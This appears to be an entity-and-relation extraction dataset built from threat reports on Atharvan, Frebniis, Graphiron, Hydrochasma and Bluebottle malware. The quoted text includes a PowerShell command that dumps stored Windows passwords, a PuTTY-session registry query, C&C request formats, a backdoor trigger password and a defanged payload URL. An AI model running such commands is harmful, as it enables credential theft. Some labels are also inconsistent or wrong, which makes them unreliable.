{"instruction": "Sysmon logs were cleared using wsmprovhost. All eventlogs were cleared using PowerShell. A scheduled task named \"network service\" was created to list file names. There is some evidence to suggest that the attackers used two legitimate software packages. One compromised computer was running Agile DGS and Agile FD servers, software developed by Jiangsu. These packages are used for document security and protection in transit. Malicious files were dropped into a folder named \u201cdgs\u201d and one of the backdoors used was renamed from atharvan.exe to agile_update.exe. It is unclear if these software packages are being injected into or installed by the attackers.", "input": null, "output": "Named Entities: (wsmprovhost, tool),  (PowerShell, tool), (backdoors, malware), (atharvan.exe, file), (agile_update.exe, file)\nRelationships: (attacker, use, wsmprovhost), (attacker, use, PowerShell), (attacker, use, backdoors), (backdoors, name, atharvan.exe), (atharvan.exe, renamed to, agile_update.exe)"}
{"instruction": "HCL Domino (formerly IBM Domino) was also run on a compromised machine in close proximity to the execution of backdoors, although it is unclear if this was a coincidence or not. However, both the Domino and Agile software appear to be using old certificates and the Agile servers use old vulnerable libraries.", "input": null, "output": "Named Entities: (HCL Domino, tool), (IBM Domino, tool), (backdoors, threat type), (Agile software, tool)\nRelationships: (HCL Domino, formerly, IBM Domino), (HCL Domino, proximity to, backdoors), "}
{"instruction": "Tools Used \nAtharvan: Custom developed remote access Trojan (RAT). \nLilith: The attackers used modified versions of the publicly available Lilith RAT. The versions used were capable of carrying out the following tasks: \nKilling the process \nRestarting the process \nModifying the sleep interval \nUninstalling the RAT \nExecuting a remote command or PowerShell script \nExiting the process \nThumbsender: Hacking tool which, when it receives a command from a command-and-control (C&C) server will list file names on the computer and save them in a file called Thumb.db before sending them to a specified IP address. \nCustom proxy tool.", "input": null, "output": "Named Entities: (Atharvan, malware), (remote access Trojan (RAT), threat type), (Lilith, malware), (Thumbsender, tool), (C&C server, tool), (Thumb.db, file), (custom proxy tool, tool)\nRelationships: (Atharvan, belong to, remote access Trojan (RAT)), (Lilith, belong to, remote access Trojan (RAT)), (Thumbsender, receive command from, C&C server), (Thumbsender, save file names in, Thumb.db)"}
{"instruction": "Atharvan Atharvan is so-named because when the malware is run, it creates a mutex named: \"SAPTARISHI-ATHARVAN-101\" to ensure that only one copy is running. It will then contact a hardcoded C&C server. The hardcoded C&C addresses seen in one of the samples analyzed to date was for Amazon AWS South Korea (Seoul) region, which is not a common location for C&C infrastructure. The C&C communications are formatted as HTTP POST requests where the Host header is hardcoded as \"update.microsoft.com\", e.g.: POST /update.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52 Host: update.microsoft.com Content-type: application/x-www-form-urlencoded Content-length: 46 id=Atharvan&code=101&cid=H^[REDACTED]&time=5 The request body includes the following parameters: \"id\": hardcoded string \"Atharvan\" \"code\": represents request purpose, which can be one of: 101: fetches commands 102: sends command outputs or error messages 103: fetches file body to write when processing command 0x12", "input": null, "output": "Named Entities: (Atharvan, malware), (C&C server, tool), (update.microsoft.com, Domain)\n\nRelationships: (Atharvan, contact, C&C server), (C&C server, domain, update.microsoft.com)"}
{"instruction": "\"cid\": hardcoded string \"H^\" followed by the network interface hardware address of the affected computer as 12 hexadecimal digits \"time\": interval between communication attempts \"msg\" (optional): depending on the request purpose as specified using \"code\" parameter: when the \"code\" parameter is 102, it includes output of commands or error messages in encrypted form when the \"code\" parameter is 103, it identifies the file to fetch in non-encrypted form When encrypting the \"msg\" value, the malware uses the following encryption algorithm: def encrypt(plaintext): return bytes([((2 - byte) & 0xff) for byte in plaintext]) The malware uses its own simplistic HTTP parser to extract the body from the server response. The extracted body is decrypted using the following algorithm: def decrypt(ciphertext): return bytes([((2 - byte) & 0xff) for byte in ciphertext]) When fetching commands, the malware expects the decrypted body to contain a sequence of strings separated by the \"\\x1A\" character.", "input": null, "output": "No related entities and relations."}
{"instruction": "The first byte of each string specifies the command to execute and the remaining bytes are interpreted as command parameters. Table 1. Atharvan commands Command Description 0x11 Configures interval between communication attempts 0x12 Downloads arbitrary file from specified control server 0x15 Runs arbitrary executable and sends its output to the remote attacker 0x16 Configures communication to use schedule type 0x16 0x17 Configures communication to use schedule type 0x17 0x18 Configures communication to use schedule type 0x18 When configuring a communication schedule, the command parameters specify the times and days for the communication attempts. Several different times can be specified, with the hour and minute of the day encoded. The days are interpreted as: No restrictions (communication schedule type 0x16) Bitmask specifying days of month (communication schedule type 0x17) Bitmask specifying days of week (communication schedule type 0x18)", "input": null, "output": "Named Entities: (Atharvan, malware)\nRelationships: No related entities and relations."}
{"instruction": "This scheduled communication configuration is another unusual feature of the malware and is not commonly seen in malware of this kind.", "input": null, "output": "No related entities and relations."}
{"instruction": "Attribution \nThere is currently no firm evidence on where Clasiopa is based or what its motivation is. A Hindi mutex is used in the Atharvan backdoor: \"SAPTARISHI-ATHARVAN-101\". Atharvan is a legendary Vedic sage of Hinduism . The backdoor also sends a post request to a C&C server with the arguments: \nd=%s&code=%d&cid=%s&time=%dtharvan \nIn addition to this, one of the passwords used by the attackers for a ZIP archive was \u201ciloveindea1998^_^\u201d. \nWhile these details could suggest that the group is based in India, it is also quite likely that the information was planted as false flags, with the password in particular seeming to be an overly obvious clue.", "input": null, "output": "Named Entities: (Clasiopa, attacker), (Atharvan, malware), (backdoor, threat type)\nRelationships: (Clasiopa, use, Atharvan), (Atharvan, belong to, backdoor)"}
{"instruction": "Hydrochasma: Previously Unknown Group Targets Medical and Shipping Organizations in Asia", "input": null, "output": "Named Entities: (Hydrochasma, attacker)\nRelationships: No related entities and relations."}
{"instruction": "No custom malware deployed in attack campaign that appears to rely exclusively on open-source tools. \nShipping companies and medical laboratories in Asia are being targeted in a likely intelligence-gathering campaign that relies exclusively on publicly available and living-off-the-land tools. \nHydrochasma,\u00a0the threat actor behind this campaign, has not been linked to any previously identified group, but appears to have a possible interest in industries that may be involved in COVID-19-related treatments or vaccines. \nThis activity has been ongoing since at least October 2022. While Symantec, by Broadcom Software , did not see any data being exfiltrated in this campaign, the targets, as well as some of the tools used, indicate that the most likely motivation in this campaign is intelligence gathering.", "input": null, "output": "Named Entities: (Hydrochasma, attacker), (open-source tools, tool)\nRelationships: (Hydrochasma, use, open-source tools)"}
{"instruction": "Attack Chain The infection vector used by Hydrochasma was most likely a phishing email. The first suspicious activity seen on machines is a lure document with a file name in the victim organization\u2019s native language that appears to indicate it was an email attachment: [TRANSLATED FROM THE ORIGINAL] Product Specification-Freight-Company Qualification Information wps-pdf Export.pdf.exe Another lure document appears to be mimicking a resume: [TRANSLATED FROM THE ORIGINAL] [REDACTED] University-Development Engineer.exe Following initial access on one machine, the attackers were seen dropping Fast Reverse Proxy (FRP), a tool that can expose a local server that is sitting behind an NAT or firewall to the internet. This drops a legitimate Microsoft Edge update file: %TEMP%\\MicrosoftEdgeUpdate.exe Another file, %TEMP%\\msedgeupdate.dll , is then seen on victim machines. But this file is actually Meterpreter, a tool that is part of the Metasploit framework and which can be used for remote access.", "input": null, "output": "Named Entities: (Hydrochasma, attacker), (phishing email, tool), (Export.pdf.exe, file), (Fast Reverse Proxy (FRP), tool), (%TEMP%\\MicrosoftEdgeUpdate.exe, file), (%TEMP%\\msedgeupdate.dll, file), (Meterpreter, tool), \nRelationships: (Hydrochasma, use, phishing email), (Hydrochasma, drop, Fast Reverse Proxy (FRP)), (Fast Reverse Proxy (FRP), drop, %TEMP%\\MicrosoftEdgeUpdate.exe), (%TEMP%\\MicrosoftEdgeUpdate.exe, drop, %TEMP%\\msedgeupdate.dll), (%TEMP%\\msedgeupdate.dll, tool, Meterpreter)"}
{"instruction": "Other tools that were subsequently seen on this victim\u2019s network included: Gogo scanning tool : An automated scanning engine originally designed for use by red teams. Process Dumper (lsass.exe) : A tool that allows attackers to dump domain passwords. Cobalt Strike Beacon : An off-the-shelf tool that can be used to execute commands, inject other processes, elevate current processes, or impersonate other processes, and upload and download files. It ostensibly has legitimate uses as a penetration testing tool but is invariably exploited by malicious actors. AlliN scanning tool : A pentesting scan tool that can be used for lateral penetration of the intranet. Fscan : A publicly available hacktool that can scan for open ports and more. Dogz proxy tool : A free VPN proxy tool. A shellcode loader and a corrupted portable executable (PE) file were also deployed on this victim\u2019s network.", "input": null, "output": "Named Entities: (Gogo scanning tool, tool), (Process Dumper, tool), (lsass.exe, file), (Cobalt Strike Beacon, tool), (AlliN scanning tool, tool), (Fscan, tool), (Dogz proxy tool, tool), (shellcode loader, tool)\nRelationships: (Process Dumper, file, lsass.exe), "}
{"instruction": "Other tactics, techniques, and procedures (TTPs) observed being used in this campaign included: SoftEtherVPN : The presence of this tool was what first prompted Symantec researchers to investigate this activity. It is free, open-source, and cross-platform VPN software. Procdump : Microsoft Sysinternals tool for monitoring an application for CPU spikes and generating crash dumps, but which can also be used as a general process dump utility. BrowserGhost : A publicly available tool that can grab passwords from an internet browser. Gost proxy : A tunneling tool. Ntlmrelay : An NTLM relay attack allows an attacker to intercept validated authentication requests in order to access network services. Task Scheduler : Allows tasks to be automated on a computer. Go-strip: Used to make a Go binary smaller in size. HackBrowserData: An open-source tool that can decrypt browser data.", "input": null, "output": "Named Entities: (SoftEtherVPN, tool), (Procdump, tool), (BrowserGhost, tool), (Gost proxy, tool), (Ntlmrelay, tool), (Task Scheduler, tool), (Go-strip, tool), (HackBrowserData, tool)\nRelationships: (campaign, use, SoftEtherVPN), (campaign, use, Procdump), (campaign, use, BrowserGhost), (campaign, use, Gost proxy), (campaign, use, Ntlmrelay), (campaign, use, Task Scheduler), (campaign, use, Go-strip), (campaign, use, HackBrowserData)"}
{"instruction": "The tools deployed by Hydrochasma indicate a desire to achieve persistent and stealthy access to victim machines, as well as an effort to escalate privileges and spread laterally across victim networks. While Symantec researchers didn\u2019t observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data. The sectors targeted also point towards the motivation behind this attack being intelligence gathering. The lack of custom malware used in this attack is also notable. Relying exclusively on living-off-the-land and publicly available tools can help make an attack stealthier, while also making attribution more difficult. Symantec did not see evidence to link this activity to a known actor, prompting us to create the new actor identity of Hydrochasma for those behind this activity.", "input": null, "output": "Named Entities: (Hydrochasma, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Frebniis: New Malware Abuses Microsoft IIS Feature to Establish Backdoor", "input": null, "output": "Named Entities: (Frebniis, malware), (Microsoft IIS, tool), (Backdoor, threat type)\nRelationships: (Frebniis, abuse, Microsoft IIS), (Frebniis, Establish, Backdoor)"}
{"instruction": "Malware injects malicious code into Failed Request Event Buffering module in order to monitor HTTP requests from attacker. Symantec, by Broadcom Software , has observed a new malware that abuses a feature of Microsoft\u2019s Internet Information Services (IIS) to deploy a backdoor onto targeted systems. The malware, dubbed Frebniis (Backdoor.Frebniis), was used by a currently unknown threat actor against targets in Taiwan.", "input": null, "output": "Named Entities: (Frebniis, malware), (Backdoor.Frebniis, malware), (Microsoft's Internet Information Services (IIS), tool)\nRelationships: (Backdoor.Frebniis, dubbed, Frebniis), (Frebniis, deploy, backdoor)"}
{"instruction": "The technique used by Frebniis involves injecting malicious code into the memory of a DLL file (iisfreb.dll) related to an IIS feature used to troubleshoot and analyze failed web page requests. This allows the malware to stealthily monitor all HTTP requests and recognize specially formatted HTTP requests sent by the attacker, allowing for remote code execution. In order to use this technique, an attacker needs to gain access to the Windows system running the IIS server by some other means. In this particular case, it is unclear how this access was achieved.", "input": null, "output": "Named Entities: (Frebniis, malware), (iisfreb.dll, file)\nRelationships: (Frebniis, inject, iisfreb.dll)"}
{"instruction": "Failed Request Event Buffering \nIIS is a general-purpose web server that runs on Windows systems to serve requested HTML pages or files. An IIS web server accepts requests from remote client computers and returns the appropriate response. IIS has a feature known as Failed Request Event Buffering (FREB) that collects data and details about requests, such as originating IP address and port, HTTP headers with cookies, etc. \nA feature called Failed Request Tracing can be used to troubleshoot IIS failed requests. Failed Request Tracing buffers the trace events for a request and flushes them to disk if the request meets the definition of \u201cfail\u201d set by the user. Failed request tracing can, for example, be used to learn why requests are returning a specific HTTP status code (401 or 404, etc.), or why a request is taking too long to process, or is not responding.", "input": null, "output": "No related entities and relations."}
{"instruction": "Stealth Code Hijacking of IIS Frebniis ensures Failed Request Tracing is enabled and then accesses w3wp.exe (IIS) process memory, obtaining the address of where the Failed Request Event Buffering code (iisfreb.dll) is loaded. With this code start address, Frebniis searches from there for a function pointer table to hijack code execution. The authors of Frebniis have determined that a particular function pointer within iisfreb.dll is called by iiscore.dll whenever any HTTP request is made to IIS from a web client. This function normally checks if the content of the HTTP request matches the Failed Request Tracing rules. Figure 1. Function pointer table used to hijack execution", "input": null, "output": "Named Entities: (IIS, tool), (Frebniis, malware), (w3wp.exe, file), (iisfreb.dll, file), (iiscore.dll, file)\nRelationships: (Frebniis, hijack, IIS), (Frebniis, access, w3wp.exe), (Frebniis, obtain, iisfreb.dll), (Frebniis, search, iisfreb.dll), (iisfreb.dll, loaded in, w3wp.exe), (iisfreb.dll, called by, iiscore.dll), (iiscore.dll, called by, HTTP request), (HTTP request, made to, IIS)"}
{"instruction": "Frebniis hijacks this function by injecting its own malicious code into IIS process memory and then replacing this function pointer with the address of its own malicious code. This hijack point allows Frebniis to stealthily receive and inspect every HTTP request to the IIS server before returning to the original function. Figure 2. After running its own malicious code, Frebniis jumps back to the original function", "input": null, "output": "Named Entities: (Frebniis, malware), (IIS server, tool)\nRelationships: (Frebniis, hijack, IIS server)"}
{"instruction": "Backdoor The Frebniis malicious injected code parses all received HTTP POST requests for /logon.aspx or /default.aspx along with a parameter password set to \u20187ux4398!\u2019. If the password matches, Frebniis decrypts and executes a section of the injected code, which is .NET executable code consisting of the main backdoor functionality. No executables are saved to disk in this process, keeping the backdoor completely stealthy. The .NET code provides proxying functionality and remote code execution controlled by a provided second HTTP parameter that is a Base64 encoded string. To enable the proxy, the encoded string is Base64 decoded and then decrypted (xor 0x08), with the first character representing a proxy command followed by expected parameters. The proxy is used to send and receive Base64 encoded data from other computer systems. This allows the attackers to communicate with internal resources that may normally be blocked from the internet via the compromised IIS server.", "input": null, "output": "Named Entities: (Backdoor, malware), (Frebniis, malware), (/logon.aspx, URL), (/default.aspx, URL), (IIS server, tool)\nRelationships: (Frebniis, parse, /logon.aspx), (Frebniis, parse, /default.aspx), (Frebniis, communicate with, IIS server)"}
{"instruction": "Table 1. Frebniis commands \u2013 the function names have been misspelled by the malware author Command Function name Parameter Description 1 CreateConnect Host:Port Connect to a remote system for proxying, returns a UUID representing the remote system 2 ReadScoket Uuid Read a Base64 string from a remote system 3 Writescoket Uuid, Base64 string Write a Base64 string to a remote system 4 CloseScoket Uuid Close the connection", "input": null, "output": "Named Entities: (Frebniis, malware)\nRelationships: No related entities and relations."}
{"instruction": "The .NET backdoor code also supports remote execution. If an HTTP call to logon.aspx or default.aspx is received without the password parameter, but with the Base64 string, the Base64 string is assumed to be C# code that will be executed straight in memory. The Base64 string is decoded and then decrypted (xor 0x08) and is expected to be an XML document with the C# code to be executed in the \u2018/doc\u2019 node under the \u2018data\u2019 attribute (E.g. <doc data=C# code>). The C# code is extracted and executed. This allows Frebniis to stealthily execute arbitrary code on the system. Figure 3. Example of how Frebniis is used", "input": null, "output": "Named Entities: (.NET backdoor code, malware), (logon.aspx, URL), (default.aspx, URL),  (Frebniis, malware)\nRelationships: (Frebniis, is, .NET backdoor code), (.NET backdoor code, HTTP call to, logon.aspx), (.NET backdoor code, HTTP call to, default.aspx)"}
{"instruction": "By hijacking and modifying IIS web server code, Frebniis is able to intercept the regular flow of HTTP request handling and look for specially formatted HTTP requests. These requests allow remote code execution and proxying to internal systems in a stealthy manner. No files or suspicious processes will be running on the system, making Frebniis a relatively unique and rare type of HTTP backdoor seen in the wild.", "input": null, "output": "Named Entities: (Frebniis, malware), (IIS web server, tool), (HTTP backdoor, threat type)\nRelationships: (Frebniis, hijack, IIS web server), (Frebniis, is, HTTP backdoor)"}
{"instruction": "Graphiron: New Russian Information Stealing Malware Deployed Against Ukraine", "input": null, "output": "Named Entities: (Graphiron, malware)\nRelationships: No related entities and relations."}
{"instruction": "Russia-linked Nodaria group has deployed a new threat designed to steal a wide range of information from infected computers. \nThe Nodaria espionage group (aka UAC-0056) is using a new piece of information stealing malware against targets in Ukraine. The malware (Infostealer.Graphiron) is written in Go and is designed to harvest a wide range of information from the infected computer, including system information, credentials, screenshots, and files. \nThe earliest evidence of Graphiron dates from October 2022. It continued to be used until at least mid-January 2023 and it is reasonable to assume that it remains part of the Nodaria toolkit.", "input": null, "output": "Named Entities: (Nodaria group, attacker), (UAC-0056, attacker), (Infostealer.Graphiron, malware)\nRelationships: (Nodaria group, aka, UAC-0056), (Nodaria group, use, Infostealer.Graphiron)"}
{"instruction": "Graphiron functionality Graphiron is a two-stage threat consisting of a downloader (Downloader.Graphiron) and a payload (Infostealer.Graphiron). The downloader contains hardcoded command-and-control (C&C) server addresses. When executed, it will check against a blacklist of malware analysis tools by checking for running processes with the names listed in Table 1. Table 1: Graphiron checks against a blacklist of malware analysis tools by checking for running processes with specific names Process names BurpSuite, BurpSuiteFree, CFF Explorer, Charles, DumpIt, Fiddler, HTTPDebuggerSVC, HTTPDebuggerUI, HookExplorer, Immunity, ImportREC, LordPE, MegaDumper, NetworkMiner, PEToolW, Proxifier, RAMMap, RAMMap64, ResourceHacker, SysInspector, WSockExpert, WinDump, Wireshar, agent.py, autoruns, autoruns, dbgview, disassembly, dumpcap, filemon, httpdebugger, httpsMon, ida,idag, idag64, idaq, idaq64, idau, idau64, idaw, idaw64, joeboxcontrol, joeboxserver, mitmdump, mitmweb, ollydbg, pestudio, proc_analyzer, processhacker, procexp, procexp64, procmon, procmon64, protection_id, pslist, reconstructor, regmon, reshacker, rpcapd, scylla, scylla_64, scylla_86, smsniff, sniff_hit, tcpvcon, tcpview, tshark, vmmat, windbg, x32dbg, x64dbg, x96dbg", "input": null, "output": "Named Entities: (Graphiron, malware), (Downloader.Graphiron, malware), (Infostealer.Graphiron, malware)\n\nRelationships: (Graphiron, consist of, Downloader.Graphiron), (Graphiron, consist of, Infostealer.Graphiron), (Downloader.Graphiron, contains, C&C server addresses)"}
{"instruction": "If no blacklisted processes are found, it will connect to a C&C server and download and decrypt the payload before adding it to autorun. The downloader is configured to run just once. If it fails to download and install the payload it won\u2019t make further attempts nor send a heartbeat. Graphiron uses AES encryption with hardcoded keys. It creates temporary files with the \".lock\" and \".trash\" extensions. It uses hardcoded file names designed to masquerade as Microsoft office executables: OfficeTemplate.exe and MicrosoftOfficeDashboard.exe The payload is capable of carrying out the following tasks: Reads MachineGuid Obtains the IP address from https://checkip.amazonaws.com Retrieves the hostname, system info, and user info Steals data from Firefox and Thunderbird Steals private keys from MobaXTerm. Steals SSH known hosts Steals data from PuTTY Steals stored passwords Takes screenshots Creates a directory Lists a directory Runs a shell command Steals an arbitrary file", "input": null, "output": "Named Entities: (Graphiron, malware), (C&C server, tool), (OfficeTemplate.exe, file), (MicrosoftOfficeDashboard.exe, file), (https://checkip.amazonaws.com, URL)\nRelationships: (Graphiron, connect to, C&C server), (Graphiron, masquerade as, OfficeTemplate.exe), (Graphiron, masquerade as, MicrosoftOfficeDashboard.exe), (Graphiron, obtain IP address from, https://checkip.amazonaws.com)"}
{"instruction": "Password theft is carried out using the following PowerShell command: [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassw ord();$_} | Select UserName, Resource, Password | Format-Table \u2013HideTableHeaders The following command was used to export the list of PuTTY sessions: \"CSIDL_SYSTEM\\reg.exe\" query HKCU\\Software\\SimonTatham\\Putty\\Sessions", "input": null, "output": "Named Entities: (PowerShell command, tool), (PuTTY sessions, tool), (CSIDL_SYSTEM\\reg.exe, file)\nRelationships: (PuTTY sessions, export, CSIDL_SYSTEM\\reg.exe)"}
{"instruction": "Similarity to older tools \nGraphiron has some similarities with older Nodaria tools such as GraphSteel and GrimPlant, which were first discovered by CERT-UA . GraphSteel is designed to exfiltrate files along with system information and credentials stolen from the password vault using PowerShell. Graphiron has similar functionality but can exfiltrate much more, such as screenshots and SSH keys. \nIn addition to this, as with earlier malware, Graphiron communicates with the C&C server using port 443 and communications are encrypted using the AES cipher. \nTable 2: Comparison between Graphiron and older Nodaria tools (GraphSteel and GrimPlant) \nMalware Go version Internal name Obfuscation Libraries used \nInfostealer.Graphiron 1.18 n/a yes jcmturner/aescts, buger/jsonparser, golang/protobuf, kbinani/screenshot, lxn/win, mattn/go-sqlite, tidwall/gjson, anmitsu/go-shlex \nDownloader.Graphiron 1.18 n/a yes jcmturner/aescts \nGraphSteel 1.16 Elephant no buger/jsonparser, aglyzov/charmap, denisbrodbeck/machineid, gorilla/websocket, jcmturner/aescts, matn/go-sqlite, tidwall/gjson \nGrimPlant 1.16 Elephant no jcmturner/aescts, denisbrodbeck/machineid, golang/protobuf, kbinani/screenshot, lxn/win, anmitsu/go-shlex", "input": null, "output": "Named Entities: (Graphiron, malware), (Nodaria tools, tool), (GraphSteel, malware), (GrimPlant, malware), (PowerShell, tool), (C&C server, tool)\nRelationships: (Graphiron, similarity to, GraphSteel), (Graphiron, similarity to, GrimPlant), ( (GraphSteel, use, PowerShell), (Graphiron, communicate with, C&C server)"}
{"instruction": "Nodaria Nodaria has been active since at least March 2021 and appears to be mainly involved in targeting organizations in Ukraine. There is also limited evidence to suggest that the group has been involved in attacks on targets in Kyrgyzstan. Third-party reporting has also linked the group to attacks on Georgia. The group sprang to public attention when it was linked to the WhisperGate wiper attacks that hit multiple Ukrainian government computers and websites in January 2022. When WhisperGate was initially loaded onto a system, the malware would overwrite the portion of the hard drive responsible for launching the operating system when the machine is booted up with a ransom note demanding $10,000 in Bitcoin. However, this was just a decoy as the WhisperGate malware destroys data on an infected machine and it cannot be recovered, even if a ransom is paid.", "input": null, "output": "Named Entities: (Nodaria, attacker), (WhisperGate, malware), (Bitcoin, threat type)\nRelationships:  (WhisperGate, linked to, Nodaria), (WhisperGate, demand, Bitcoin)"}
{"instruction": "The group\u2019s usual infection vector is spear-phishing emails, which are then used to deliver a range of payloads to targets. Custom tools used by the group to date include: Elephant Dropper: A dropper Elephant Downloader: A downloader SaintBot: A downloader OutSteel: Information stealer GrimPlant (aka Elephant Implant): Collects system information and maintains persistence GraphSteel (aka Elephant Client): Information stealer Like Graphiron, many of Nodaria\u2019s earlier tools were written in Go. Graphiron appears to be the latest piece of malware authored by the same developers, likely in response to a need for additional functionality. While GraphSteel and GrimPlant used Go version 1.16, Graphiron uses version 1.18, confirming it is a more recent development. While Nodaria was relatively unknown prior to the Russian invasion of Ukraine, the group\u2019s high-level activity over the past year suggests that it is now one of the key players in Russia\u2019s ongoing cyber campaigns against Ukraine.", "input": null, "output": "Named Entities: (spear-phishing emails, tool), (Elephant Dropper, tool), (Elephant Downloader, tool), (SaintBot, tool), (OutSteel, tool), (GrimPlant, malware), (Elephant Implant, malware), (GraphSteel, malware), (Elephant Client, malware), (Graphiron, malware), (Nodaria, attacker)\nRelationships: (Nodaria, use, spear-phishing emails), (Nodaria, use, Elephant Dropper), (Nodaria, use, Elephant Downloader), (Nodaria, use, SaintBot), (Nodaria, use, OutSteel), (Nodaria, use, GrimPlant), (Nodaria, use, GraphSteel), (Nodaria, use, Elephant Client), (Nodaria, use, Graphiron)"}
{"instruction": "Bluebottle: Campaign Hits Banks in French-speaking Countries in Africa", "input": null, "output": "Named Entities: (Bluebottle, malware)\nRelationships: No related entities and relations."}
{"instruction": "Continuation of previously documented activity leverages new TTPs. Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign. The activity observed by Symantec, a division of Broadcom Software , appears to be a continuation of activity documented in a Group-IB report from November 2022 . The activity documented by Group-IB spanned from mid-2019 to 2021, and it said that during that period this group, which it called OPERA1ER, stole at least $11 million in the course of 30 targeted attacks. Similarities in the tactics, techniques, and procedures (TTPs) between the activity documented by Group-IB and the activity seen by Symantec include: Same domain seen in both sets of activity: personnel[.]bdm-sa[.]fr", "input": null, "output": "Named Entities: (Bluebottle, attacker), (OPERA1ER, attacker), (personnel[.]bdm-sa[.]fr, Domain)\nRelationships: (Bluebottle, continuation of, OPERA1ER), (personnel[.]bdm-sa[.]fr, seen in, Bluebottle), (personnel[.]bdm-sa[.]fr, seen in, OPERA1ER)"}
{"instruction": "Some of the same tools used: Ngrok; PsExec; RDPWrap; Revealer Keylogger; Cobalt Strike Beacon No custom malware found in either set of activity The crossover in targeting of French-speaking nations in Africa Both sets of activity also feature the use of industry-specific, and region-specific, domain names While this does appear to be a continuation of the activity documented by Group-IB, the activity seen by Symantec is more recent, running from at least July 2022 to September 2022, though some of the activity may have begun as far back as May 2022. Some new TTPs have also been employed in recent attacks, including: Some indications the attackers may have used ISO files as an initial infection vector The use of the commodity malware GuLoader in the initial stages of the attack Indications the attackers have adopted the technique of abusing kernel drivers to disable defenses", "input": null, "output": "Named Entities: (Ngrok, tool), (PsExec, tool), (RDPWrap, tool), (Revealer Keylogger, tool), (Cobalt Strike Beacon, tool), (GuLoader, malware)\nRelationships: (Ngrok, used in, activity), (PsExec, used in, activity), (RDPWrap, used in, activity), (Revealer Keylogger, used in, activity), (Cobalt Strike Beacon, used in, activity), (GuLoader, used in, activity)"}
{"instruction": "Attack chain The initial infection vector is unknown, but the earliest malicious files found on victim networks had French-language, job-themed file names. These likely acted as lures. In some cases, the malware was named to trick the user into thinking it was a PDF file, e.g.: fiche de poste.exe (\"job description\") fiche de candidature.exe (\"application form\") fiche de candidature.pdf.exe (\"application form\") It\u2019s most likely these files were delivered to victims via a spear-phishing email, which would align with the initial infection vector documented by Group-IB for the OPERA1ER activity. Although the majority of the activity observed by Symantec researchers began in July 2022, at least one victim was found to have an infostealer with a similar naming theme on its network as early as mid-May 2022. In that case, the malware arrived in the form of a ZIP file containing an executable SCR file. fiche de candidature(1).zip (ZIP file)", "input": null, "output": "Named Entities:(fiche de poste.exe, file), (fiche de candidature.exe, file), (fiche de candidature.pdf.exe, file), (fiche de candidature(1).zip, file)\nRelationships: (malware, named, fiche de poste.exe), (malware, named, fiche de candidature.pdf.exe), (malware, named, fiche de candidature.pdf.exe), (malware, contain, fiche de candidature(1).zip)"}
{"instruction": "fiche de candidature.scr (executable SCR file) The file is an older, likely commodity, malware. It's difficult to determine when it was used to target the organization. It is, however, consistent with infection vectors reported as used by OPERA1ER in 2021.", "input": null, "output": "Named Entities: (fiche de candidature.scr, file), (commodity malware, malware), (OPERA1ER, attacker)\nRelationships: (fiche de candidature.scr, used by, OPERA1ER)"}
{"instruction": "However, the job-themed malware in July was observed in paths suggesting it had been mounted as CD-ROMs. This could indicate a genuine disc was inserted, but it could also be that a malicious ISO file was delivered to victims and mounted. An ISO file is an archive file that contains an identical copy or image of the data that would be found on an optical disc. Malicious ISO files have been used as an initial infection vector in other campaigns in 2022, including being used alongside the Bumblebee loader in a campaign where delivering ransomware was the ultimate goal . If the Bluebottle and OPERA1ER actors are indeed one and the same, this would mean that they swapped out their infection techniques between May and July 2022. ISO files were not seen in the activity documented by Group-IB.", "input": null, "output": "Named Entities: (job-themed malware, malware), (Bumblebee loader, tool), (ransomware, threat type), (Bluebottle, attacker), (OPERA1ER, attacker)\nRelationships: (job-themed malware, use, Bumblebee loader),  (Bumblebee loader, used in, ransomware campaign), (Bluebottle, same as, OPERA1ER)"}
{"instruction": "In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity was ieinstal.exe , the Internet Explorer Add-on Installer, but also included aspnet_regbrowsers.exe , the ASP.NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious .NET downloader from URLs such as hxxp://178.73.192[.]15/ca1.exe . Multiple .NET downloaders were found that abused the file transfer service transfer[.]sh to download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a .NET DLL.", "input": null, "output": "Named Entities: (GuLoader, malware), (NSIS executable, file), (ieinstal.exe, file), (aspnet_regbrowsers.exe, file), (hxxp://178.73.192[.]15/ca1.exe, URL), (transfer[.]sh, Domain)\n\nRelationships: (GuLoader, delivered as, NSIS executable), (GuLoader, observed process, ieinstal.exe), (GuLoader, observed process, ieinstal.exe), (GuLoader, downloaded from, hxxp://178.73.192[.]15/ca1.exe), (GuLoader, abused, transfer[.]sh)"}
{"instruction": "After GuLoader and the .NET loaders were deployed, various other post-compromise tools were seen on victim networks. These include the publicly available Netwire remote access Trojan (RAT) and the open-source Quasar RAT. The attackers also used the commercial post-compromise tool Cobalt Strike Beacon. The Cobalt Strike Beacon variant used by Bluebottle employed an API hammering technique in order to hamper analysis.", "input": null, "output": "Named Entities: (GuLoader, malware), (.NET loaders, tool), (Netwire remote access Trojan, malware), (Quasar RAT, malware), (Cobalt Strike Beacon, tool), (Bluebottle, attacker)\nRelationships:  (Bluebottle, use, Netwire remote access Trojan), (Bluebottle use, Quasar RAT), (Bluebottle, use, Cobalt Strike Beacon)"}
